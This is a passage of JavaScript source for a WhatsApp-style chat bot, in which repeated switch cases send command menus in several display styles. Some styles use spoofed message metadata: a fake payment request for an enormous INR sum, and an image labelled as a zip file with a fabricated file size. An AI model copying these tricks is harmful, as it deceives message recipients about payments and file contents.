                                thumbnail: fs.readFileSync('./Media/theme/menu.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: m
                    })
                }   if (typemenu === 'v3') {
                    SenseiOfc.sendMessage(m.chat, {
                        video: fs.readFileSync('./Media/theme/Cheems-bot.mp4'),
                        caption: xmenu_oh
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v4') {
                    SenseiOfc.sendMessage(m.chat, {
                        video: fs.readFileSync('./Media/theme/Cheems-bot.mp4'),
                        caption: xmenu_oh,
                        gifPlayback: true
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v5') {
                    SenseiOfc.relayMessage(m.chat, {
                        scheduledCallCreationMessage: {
                            callType: "AUDIO",
                            scheduledTimestampMs: 1200,
                            title: xmenu_oh
                        }
                    }, {})
                } else if (typemenu === 'v6') {
                    SenseiOfc.relayMessage(m.chat,  {
                       requestPaymentMessage: {
                          currencyCodeIso4217: 'INR',
                          amount1000: '9999999900',
                          requestFrom: m.sender,
                          noteMessage: {
                             extendedTextMessage: {
                                text: xmenu_oh,
                                contextInfo: {
                                   externalAdReply: {
                                       showAdAttribution: true
                                   }
                                }
                             }
                          }
                       }
                    }, {})
                } else if (typemenu === 'v7') {
                    SenseiOfc.sendMessage(m.chat, {
                        document: {
                           url: 'https://i.ibb.co/2W0H9Jq/avatar-contact.png'
                        },
                        caption: xmenu_oh,
                        mimetype: 'application/zip',
                        fileName: ownername,
                        fileLength: "99999999999",
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./Media/theme/menu.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: fstatus 
                    })
                } else if (typemenu === 'v8') {
                	SenseiOfc.sendMessage(m.chat, {
      video: fs.readFileSync('./Media/theme/Cheems-bot.mp4'),
      gifPlayback: true,
      caption: xmenu_oh,
      contextInfo: {
      externalAdReply: {
      title: botname,
      body: ownername,
      thumbnailUrl: 'https://i.ibb.co/Wppj16p/cheemspic.jpg',
      sourceUrl: ``,
      mediaType: 1,
      renderLargerThumbnail: true
      }
      }
      }, {
                        quoted: m
                    })
                    }
}
break
case 'othermenu': {
let xmenu_oh = `Hi ${pushname}${readmore}\n\n${othermenu(prefix, hituet)}`
if (typemenu === 'v1') {
                    SenseiOfc.sendMessage(m.chat, {
                        image: fs.readFileSync('./Media/theme/menu.jpg'),
                        caption: xmenu_oh
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v2') {
                    SenseiOfc.sendMessage(m.chat, {
                        text: xmenu_oh,
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./Media/theme/menu.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: m
                    })
                }   if (typemenu === 'v3') {
                    SenseiOfc.sendMessage(m.chat, {
                        video: fs.readFileSync('./Media/theme/Cheems-bot.mp4'),
                        caption: xmenu_oh
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v4') {
                    SenseiOfc.sendMessage(m.chat, {
                        video: fs.readFileSync('./Media/theme/Cheems-bot.mp4'),
                        caption: xmenu_oh,
                        gifPlayback: true
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v5') {
                    SenseiOfc.relayMessage(m.chat, {
                        scheduledCallCreationMessage: {
                            callType: "AUDIO",
                            scheduledTimestampMs: 1200,
                            title: xmenu_oh
                        }
                    }, {})
                } else if (typemenu === 'v6') {
                    SenseiOfc.relayMessage(m.chat,  {
                       requestPaymentMessage: {
                          currencyCodeIso4217: 'INR',
                          amount1000: '9999999900',
                          requestFrom: m.sender,
                          noteMessage: {
                             extendedTextMessage: {
                                text: xmenu_oh,
                                contextInfo: {
                                   externalAdReply: {
                                       showAdAttribution: true
                                   }
                                }
                             }
                          }
                       }
                    }, {})
                } else if (typemenu === 'v7') {
                    SenseiOfc.sendMessage(m.chat, {
                        document: {
                           url: 'https://i.ibb.co/2W0H9Jq/avatar-contact.png'
                        },
                        caption: xmenu_oh,
                        mimetype: 'application/zip',
                        fileName: ownername,
                        fileLength: "99999999999",
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./Media/theme/menu.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: fstatus 
                    })
                } else if (typemenu === 'v8') {
                	SenseiOfc.sendMessage(m.chat, {
      video: fs.readFileSync('./Media/theme/Cheems-bot.mp4'),
      gifPlayback: true,
      caption: xmenu_oh,
      contextInfo: {
      externalAdReply: {
      title: botname,
      body: ownername,
      thumbnailUrl: 'https://i.ibb.co/Wppj16p/cheemspic.jpg',
      sourceUrl: ``,
      mediaType: 1,
      renderLargerThumbnail: true
      }
      }
      }, {
                        quoted: m
                    })
                    }
}
break
case 'downloadmenu': {
let xmenu_oh = `Hi ${pushname}${readmore}\n\n${downloadmenu(prefix, hituet)}`
if (typemenu === 'v1') {
                    SenseiOfc.sendMessage(m.chat, {
                        image: fs.readFileSync('./Media/theme/menu.jpg'),
                        caption: xmenu_oh
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v2') {
                    SenseiOfc.sendMessage(m.chat, {
                        text: xmenu_oh,
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./Media/theme/menu.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: m
                    })
                }   if (typemenu === 'v3') {
                    SenseiOfc.sendMessage(m.chat, {
                        video: fs.readFileSync('./Media/theme/Cheems-bot.mp4'),
                        caption: xmenu_oh
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v4') {
                    SenseiOfc.sendMessage(m.chat, {
                        video: fs.readFileSync('./Media/theme/Cheems-bot.mp4'),
                        caption: xmenu_oh,
                        gifPlayback: true
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v5') {
                    SenseiOfc.relayMessage(m.chat, {
                        scheduledCallCreationMessage: {
                            callType: "AUDIO",
                            scheduledTimestampMs: 1200,
                            title: xmenu_oh
                        }
                    }, {})
                } else if (typemenu === 'v6') {
                    SenseiOfc.relayMessage(m.chat,  {
                       requestPaymentMessage: {
                          currencyCodeIso4217: 'INR',
                          amount1000: '9999999900',
                          requestFrom: m.sender,
                          noteMessage: {
                             extendedTextMessage: {
                                text: xmenu_oh,
                                contextInfo: {
                                   externalAdReply: {
                                       showAdAttribution: true
                                   }
                                }
                             }
                          }
                       }
                    }, {})
                } else if (typemenu === 'v7') {
                    SenseiOfc.sendMessage(m.chat, {
                        document: {
                           url: 'https://i.ibb.co/2W0H9Jq/avatar-contact.png'
                        },
                        caption: xmenu_oh,
                        mimetype: 'application/zip',
                        fileName: ownername,
                        fileLength: "99999999999",
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./Media/theme/menu.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: fstatus 
                    })
                } else if (typemenu === 'v8') {
                	SenseiOfc.sendMessage(m.chat, {
      video: fs.readFileSync('./Media/theme/Cheems-bot.mp4'),
      gifPlayback: true,
      caption: xmenu_oh,
      contextInfo: {
      externalAdReply: {
      title: botname,
      body: ownername,
      thumbnailUrl: 'https://i.ibb.co/Wppj16p/cheemspic.jpg',
      sourceUrl: ``,
      mediaType: 1,
      renderLargerThumbnail: true
      }
      }
      }, {
                        quoted: m
                    })
                    }
}
break
case 'groupmenu': {
let xmenu_oh = `Hi ${pushname}${readmore}\n\n${groupmenu(prefix, hituet)}`
if (typemenu === 'v1') {
                    SenseiOfc.sendMessage(m.chat, {
                        image: fs.readFileSync('./Media/theme/menu.jpg'),
                        caption: xmenu_oh
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v2') {
                    SenseiOfc.sendMessage(m.chat, {
                        text: xmenu_oh,
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./Media/theme/menu.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: m
                    })
                }   if (typemenu === 'v3') {
                    SenseiOfc.sendMessage(m.chat, {
                        video: fs.readFileSync('./Media/theme/Cheems-bot.mp4'),
                        caption: xmenu_oh
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v4') {
                    SenseiOfc.sendMessage(m.chat, {
                        video: fs.readFileSync('./Media/theme/Cheems-bot.mp4'),
                        caption: xmenu_oh,
                        gifPlayback: true
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v5') {
                    SenseiOfc.relayMessage(m.chat, {
                        scheduledCallCreationMessage: {
                            callType: "AUDIO",
                            scheduledTimestampMs: 1200,
                            title: xmenu_oh
                        }
                    }, {})
                } else if (typemenu === 'v6') {
                    SenseiOfc.relayMessage(m.chat,  {
                       requestPaymentMessage: {
                          currencyCodeIso4217: 'INR',
                          amount1000: '9999999900',
                          requestFrom: m.sender,
                          noteMessage: {
                             extendedTextMessage: {
                                text: xmenu_oh,
                                contextInfo: {
                                   externalAdReply: {
                                       showAdAttribution: true
                                   }
                                }
                             }
                          }
                       }
                    }, {})
                } else if (typemenu === 'v7') {
                    SenseiOfc.sendMessage(m.chat, {
                        document: {
                           url: 'https://i.ibb.co/2W0H9Jq/avatar-contact.png'
                        },
                        caption: xmenu_oh,
                        mimetype: 'application/zip',
                        fileName: ownername,
                        fileLength: "99999999999",
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./Media/theme/menu.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: fstatus 
                    })
                } else if (typemenu === 'v8') {
                	SenseiOfc.sendMessage(m.chat, {
      video: fs.readFileSync('./Media/theme/Cheems-bot.mp4'),
      gifPlayback: true,
      caption: xmenu_oh,
      contextInfo: {
      externalAdReply: {
      title: botname,
      body: ownername,
      thumbnailUrl: 'https://i.ibb.co/Wppj16p/cheemspic.jpg',
      sourceUrl: ``,
      mediaType: 1,
      renderLargerThumbnail: true
      }
      }
      }, {
                        quoted: m
                    })
                    }
}
break
case 'funmenu': {
let xmenu_oh = `Hi ${pushname}${readmore}\n\n${funmenu(prefix, hituet)}`
if (typemenu === 'v1') {
                    SenseiOfc.sendMessage(m.chat, {
                        image: fs.readFileSync('./Media/theme/menu.jpg'),
                        caption: xmenu_oh
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v2') {
                    SenseiOfc.sendMessage(m.chat, {
                        text: xmenu_oh,
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./Media/theme/menu.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: m
                    })
                }   if (typemenu === 'v3') {
                    SenseiOfc.sendMessage(m.chat, {
                        video: fs.readFileSync('./Media/theme/Cheems-bot.mp4'),
                        caption: xmenu_oh
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v4') {
                    SenseiOfc.sendMessage(m.chat, {
                        video: fs.readFileSync('./Media/theme/Cheems-bot.mp4'),
                        caption: xmenu_oh,
                        gifPlayback: true
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v5') {
                    SenseiOfc.relayMessage(m.chat, {
                        scheduledCallCreationMessage: {
                            callType: "AUDIO",
                            scheduledTimestampMs: 1200,
                            title: xmenu_oh
                        }
                    }, {})
                } else if (typemenu === 'v6') {
                    SenseiOfc.relayMessage(m.chat,  {
                       requestPaymentMessage: {
                          currencyCodeIso4217: 'INR',
                          amount1000: '9999999900',
                          requestFrom: m.sender,
                          noteMessage: {
                             extendedTextMessage: {
                                text: xmenu_oh,
                                contextInfo: {
                                   externalAdReply: {
                                       showAdAttribution: true
                                   }
                                }
                             }
                          }
                       }
                    }, {})
                } else if (typemenu === 'v7') {
                    SenseiOfc.sendMessage(m.chat, {
                        document: {
                           url: 'https://i.ibb.co/2W0H9Jq/avatar-contact.png'
                        },
                        caption: xmenu_oh,
                        mimetype: 'application/zip',
                        fileName: ownername,
                        fileLength: "99999999999",
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./Media/theme/menu.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: fstatus 
                    })
                } else if (typemenu === 'v8') {
                	SenseiOfc.sendMessage(m.chat, {
      video: fs.readFileSync('./Media/theme/Cheems-bot.mp4'),
      gifPlayback: true,
      caption: xmenu_oh,
      contextInfo: {
      externalAdReply: {
      title: botname,
      body: ownername,
      thumbnailUrl: 'https://i.ibb.co/Wppj16p/cheemspic.jpg',
      sourceUrl: ``,
      mediaType: 1,
      renderLargerThumbnail: true
      }
      }
      }, {
                        quoted: m
                    })
                    }
}
break
case 'stalkermenu': {
let xmenu_oh = `Hi ${pushname}${readmore}\n\n${stalkermenu(prefix, hituet)}`
if (typemenu === 'v1') {
                    SenseiOfc.sendMessage(m.chat, {
                        image: fs.readFileSync('./Media/theme/menu.jpg'),
                        caption: xmenu_oh
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v2') {
                    SenseiOfc.sendMessage(m.chat, {
                        text: xmenu_oh,
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./Media/theme/menu.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: m
                    })
                }   if (typemenu === 'v3') {
                    SenseiOfc.sendMessage(m.chat, {
                        video: fs.readFileSync('./Media/theme/Cheems-bot.mp4'),
                        caption: xmenu_oh
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v4') {
                    SenseiOfc.sendMessage(m.chat, {
                        video: fs.readFileSync('./Media/theme/Cheems-bot.mp4'),
                        caption: xmenu_oh,
                        gifPlayback: true
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v5') {
                    SenseiOfc.relayMessage(m.chat, {
                        scheduledCallCreationMessage: {
                            callType: "AUDIO",
                            scheduledTimestampMs: 1200,
                            title: xmenu_oh
                        }
                    }, {})
                } else if (typemenu === 'v6') {
                    SenseiOfc.relayMessage(m.chat,  {
                       requestPaymentMessage: {
                          currencyCodeIso4217: 'INR',
                          amount1000: '9999999900',
                          requestFrom: m.sender,
                          noteMessage: {
                             extendedTextMessage: {
                                text: xmenu_oh,
                                contextInfo: {
                                   externalAdReply: {
                                       showAdAttribution: true
                                   }
                                }
                             }
                          }
                       }
                    }, {})
                } else if (typemenu === 'v7') {
                    SenseiOfc.sendMessage(m.chat, {
                        document: {
                           url: 'https://i.ibb.co/2W0H9Jq/avatar-contact.png'
                        },
                        caption: xmenu_oh,
                        mimetype: 'application/zip',
                        fileName: ownername,
                        fileLength: "99999999999",
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./Media/theme/menu.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: fstatus 
                    })
                } else if (typemenu === 'v8') {
                	SenseiOfc.sendMessage(m.chat, {
      video: fs.readFileSync('./Media/theme/Cheems-bot.mp4'),
      gifPlayback: true,
      caption: xmenu_oh,
      contextInfo: {
      externalAdReply: {
      title: botname,
      body: ownername,
      thumbnailUrl: 'https://i.ibb.co/Wppj16p/cheemspic.jpg',
      sourceUrl: ``,
      mediaType: 1,
      renderLargerThumbnail: true
      }
      }
      }, {
                        quoted: m
                    })
                    }
}
break
case 'randomphotomenu': {
let xmenu_oh = `Hi ${pushname}${readmore}\n\n${randphotomenu(prefix, hituet)}`
if (typemenu === 'v1') {
                    SenseiOfc.sendMessage(m.chat, {
                        image: fs.readFileSync('./Media/theme/menu.jpg'),
                        caption: xmenu_oh
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v2') {
                    SenseiOfc.sendMessage(m.chat, {
                        text: xmenu_oh,
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./Media/theme/menu.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: m
                    })
                }   if (typemenu === 'v3') {
                    SenseiOfc.sendMessage(m.chat, {
                        video: fs.readFileSync('./Media/theme/Cheems-bot.mp4'),
                        caption: xmenu_oh
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v4') {
                    SenseiOfc.sendMessage(m.chat, {
                        video: fs.readFileSync('./Media/theme/Cheems-bot.mp4'),
                        caption: xmenu_oh,
                        gifPlayback: true
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v5') {
                    SenseiOfc.relayMessage(m.chat, {
                        scheduledCallCreationMessage: {
                            callType: "AUDIO",
                            scheduledTimestampMs: 1200,
                            title: xmenu_oh
                        }
                    }, {})
                } else if (typemenu === 'v6') {
                    SenseiOfc.relayMessage(m.chat,  {
                       requestPaymentMessage: {
                          currencyCodeIso4217: 'INR',
                          amount1000: '9999999900',
                          requestFrom: m.sender,
                          noteMessage: {
                             extendedTextMessage: {
                                text: xmenu_oh,
                                contextInfo: {
                                   externalAdReply: {
                                       showAdAttribution: true
                                   }
                                }
                             }
                          }
                       }
                    }, {})
                } else if (typemenu === 'v7') {
                    SenseiOfc.sendMessage(m.chat, {
                        document: {
                           url: 'https://i.ibb.co/2W0H9Jq/avatar-contact.png'
                        },
                        caption: xmenu_oh,
                        mimetype: 'application/zip',
                        fileName: ownername,
                        fileLength: "99999999999",
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./Media/theme/menu.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: fstatus 
                    })
                } else if (typemenu === 'v8') {
                	SenseiOfc.sendMessage(m.chat, {
      video: fs.readFileSync('./Media/theme/Cheems-bot.mp4'),
      gifPlayback: true,
      caption: xmenu_oh,
      contextInfo: {
      externalAdReply: {
      title: botname,
      body: ownername,
      thumbnailUrl: 'https://i.ibb.co/Wppj16p/cheemspic.jpg',
      sourceUrl: ``,
      mediaType: 1,
      renderLargerThumbnail: true
      }
      }
      }, {
                        quoted: m
                    })
                    }
}
break
case 'randomvideomenu': {
let xmenu_oh = `Hi ${pushname}${readmore}\n\n${randvideomenu(prefix, hituet)}`
if (typemenu === 'v1') {
                    SenseiOfc.sendMessage(m.chat, {
                        image: fs.readFileSync('./Media/theme/menu.jpg'),
                        caption: xmenu_oh
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v2') {
                    SenseiOfc.sendMessage(m.chat, {
                        text: xmenu_oh,
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./Media/theme/menu.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: m
                    })
                }   if (typemenu === 'v3') {
                    SenseiOfc.sendMessage(m.chat, {
                        video: fs.readFileSync('./Media/theme/Cheems-bot.mp4'),
                        caption: xmenu_oh
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v4') {
                    SenseiOfc.sendMessage(m.chat, {
                        video: fs.readFileSync('./Media/theme/Cheems-bot.mp4'),
                        caption: xmenu_oh,
                        gifPlayback: true
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v5') {
                    SenseiOfc.relayMessage(m.chat, {
                        scheduledCallCreationMessage: {
                            callType: "AUDIO",
                            scheduledTimestampMs: 1200,
                            title: xmenu_oh
                        }
                    }, {})
                } else if (typemenu === 'v6') {
                    SenseiOfc.relayMessage(m.chat,  {
                       requestPaymentMessage: {
                          currencyCodeIso4217: 'INR',
                          amount1000: '9999999900',
                          requestFrom: m.sender,
                          noteMessage: {
                             extendedTextMessage: {
                                text: xmenu_oh,
                                contextInfo: {
                                   externalAdReply: {
                                       showAdAttribution: true
                                   }
                                }
                             }
                          }
                       }
                    }, {})
                } else if (typemenu === 'v7') {
                    SenseiOfc.sendMessage(m.chat, {
                        document: {
                           url: 'https://i.ibb.co/2W0H9Jq/avatar-contact.png'
                        },
                        caption: xmenu_oh,
                        mimetype: 'application/zip',
                        fileName: ownername,
                        fileLength: "99999999999",
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./Media/theme/menu.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: fstatus 
                    })
                } else if (typemenu === 'v8') {
                	SenseiOfc.sendMessage(m.chat, {
      video: fs.readFileSync('./Media/theme/Cheems-bot.mp4'),
      gifPlayback: true,
      caption: xmenu_oh,
      contextInfo: {
      externalAdReply: {
      title: botname,
      body: ownername,
      thumbnailUrl: 'https://i.ibb.co/Wppj16p/cheemspic.jpg',
      sourceUrl: ``,
      mediaType: 1,
      renderLargerThumbnail: true
      }
      }
      }, {
                        quoted: m
                    })
                    }
}
break
case 'photooxymenu': {
let xmenu_oh = `Hi ${pushname}${readmore}\n\n${photooxymenu(prefix, hituet)}`
if (typemenu === 'v1') {
                    SenseiOfc.sendMessage(m.chat, {
                        image: fs.readFileSync('./Media/theme/menu.jpg'),
                        caption: xmenu_oh
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v2') {
                    SenseiOfc.sendMessage(m.chat, {
                        text: xmenu_oh,
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./Media/theme/menu.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: m
                    })
                }   if (typemenu === 'v3') {
                    SenseiOfc.sendMessage(m.chat, {
                        video: fs.readFileSync('./Media/theme/Cheems-bot.mp4'),
                        caption: xmenu_oh
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v4') {
                    SenseiOfc.sendMessage(m.chat, {
                        video: fs.readFileSync('./Media/theme/Cheems-bot.mp4'),
                        caption: xmenu_oh,
                        gifPlayback: true
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v5') {
                    SenseiOfc.relayMessage(m.chat, {
                        scheduledCallCreationMessage: {
                            callType: "AUDIO",
                            scheduledTimestampMs: 1200,
                            title: xmenu_oh
                        }
                    }, {})
                } else if (typemenu === 'v6') {
                    SenseiOfc.relayMessage(m.chat,  {
                       requestPaymentMessage: {
                          currencyCodeIso4217: 'INR',
                          amount1000: '9999999900',
                          requestFrom: m.sender,
                          noteMessage: {
                             extendedTextMessage: {
                                text: xmenu_oh,
                                contextInfo: {
                                   externalAdReply: {
                                       showAdAttribution: true
                                   }
                                }
                             }
                          }
                       }
                    }, {})
                } else if (typemenu === 'v7') {
                    SenseiOfc.sendMessage(m.chat, {
                        document: {
                           url: 'https://i.ibb.co/2W0H9Jq/avatar-contact.png'
                        },
                        caption: xmenu_oh,
                        mimetype: 'application/zip',
                        fileName: ownername,
                        fileLength: "99999999999",
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./Media/theme/menu.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: fstatus 
                    })
                } else if (typemenu === 'v8') {
                	SenseiOfc.sendMessage(m.chat, {
      video: fs.readFileSync('./Media/theme/Cheems-bot.mp4'),
      gifPlayback: true,
      caption: xmenu_oh,
      contextInfo: {
      externalAdReply: {
      title: botname,
      body: ownername,
      thumbnailUrl: 'https://i.ibb.co/Wppj16p/cheemspic.jpg',
      sourceUrl: ``,
      mediaType: 1,
      renderLargerThumbnail: true
      }
      }
      }, {
                        quoted: m
                    })
                    }
}
break
case 'ephoto360menu': {
let xmenu_oh = `Hi ${pushname}${readmore}\n\n${ephoto360menu(prefix, hituet)}`
if (typemenu === 'v1') {
                    SenseiOfc.sendMessage(m.chat, {
                        image: fs.readFileSync('./Media/theme/menu.jpg'),
                        caption: xmenu_oh
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v2') {
                    SenseiOfc.sendMessage(m.chat, {
                        text: xmenu_oh,
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./Media/theme/menu.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: m
                    })
                }   if (typemenu === 'v3') {
                    SenseiOfc.sendMessage(m.chat, {
                        video: fs.readFileSync('./Media/theme/Cheems-bot.mp4'),
                        caption: xmenu_oh
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v4') {
                    SenseiOfc.sendMessage(m.chat, {
                        video: fs.readFileSync('./Media/theme/Cheems-bot.mp4'),
                        caption: xmenu_oh,
                        gifPlayback: true
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v5') {
                    SenseiOfc.relayMessage(m.chat, {
                        scheduledCallCreationMessage: {
                            callType: "AUDIO",
                            scheduledTimestampMs: 1200,
                            title: xmenu_oh
                        }
                    }, {})
                } else if (typemenu === 'v6') {
                    SenseiOfc.relayMessage(m.chat,  {
                       requestPaymentMessage: {
                          currencyCodeIso4217: 'INR',
                          amount1000: '9999999900',
                          requestFrom: m.sender,
                          noteMessage: {
                             extendedTextMessage: {
                                text: xmenu_oh,
                                contextInfo: {
                                   externalAdReply: {
                                       showAdAttribution: true
                                   }
                                }
                             }
                          }
                       }
                    }, {})
                } else if (typemenu === 'v7') {
                    SenseiOfc.sendMessage(m.chat, {
                        document: {
                           url: 'https://i.ibb.co/2W0H9Jq/avatar-contact.png'
                        },
                        caption: xmenu_oh,
                        mimetype: 'application/zip',
                        fileName: ownername,
                        fileLength: "99999999999",
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./Media/theme/menu.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: fstatus 
                    })
                } else if (typemenu === 'v8') {
                	SenseiOfc.sendMessage(m.chat, {
      video: fs.readFileSync('./Media/theme/Cheems-bot.mp4'),
      gifPlayback: true,
      caption: xmenu_oh,
      contextInfo: {
      externalAdReply: {
      title: botname,
      body: ownername,
      thumbnailUrl: 'https://i.ibb.co/Wppj16p/cheemspic.jpg',
      sourceUrl: ``,
      mediaType: 1,
      renderLargerThumbnail: true
      }
      }
      }, {
                        quoted: m
                    })
                    }
}
break
case 'nsfwmenu': {
let xmenu_oh = `Hi ${pushname}${readmore}\n\n${nsfwmenu(prefix, hituet)}`
if (typemenu === 'v1') {
                    SenseiOfc.sendMessage(m.chat, {
                        image: fs.readFileSync('./Media/theme/menu.jpg'),
                        caption: xmenu_oh
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v2') {
                    SenseiOfc.sendMessage(m.chat, {
                        text: xmenu_oh,
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./Media/theme/menu.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: m
                    })
                }   if (typemenu === 'v3') {
                    SenseiOfc.sendMessage(m.chat, {
                        video: fs.readFileSync('./Media/theme/Cheems-bot.mp4'),
                        caption: xmenu_oh
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v4') {
                    SenseiOfc.sendMessage(m.chat, {
                        video: fs.readFileSync('./Media/theme/Cheems-bot.mp4'),
                        caption: xmenu_oh,
                        gifPlayback: true
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v5') {
                    SenseiOfc.relayMessage(m.chat, {
                        scheduledCallCreationMessage: {
                            callType: "AUDIO",
                            scheduledTimestampMs: 1200,
                            title: xmenu_oh
                        }
                    }, {})
                } else if (typemenu === 'v6') {
                    SenseiOfc.relayMessage(m.chat,  {
                       requestPaymentMessage: {
                          currencyCodeIso4217: 'INR',
                          amount1000: '9999999900',
                          requestFrom: m.sender,
                          noteMessage: {
                             extendedTextMessage: {
                                text: xmenu_oh,
                                contextInfo: {
                                   externalAdReply: {
                                       showAdAttribution: true
                                   }
                                }
                             }
                          }
                       }
                    }, {})
                } else if (typemenu === 'v7') {
                    SenseiOfc.sendMessage(m.chat, {
                        document: {
                           url: 'https://i.ibb.co/2W0H9Jq/avatar-contact.png'
                        },
                        caption: xmenu_oh,
                        mimetype: 'application/zip',
                        fileName: ownername,
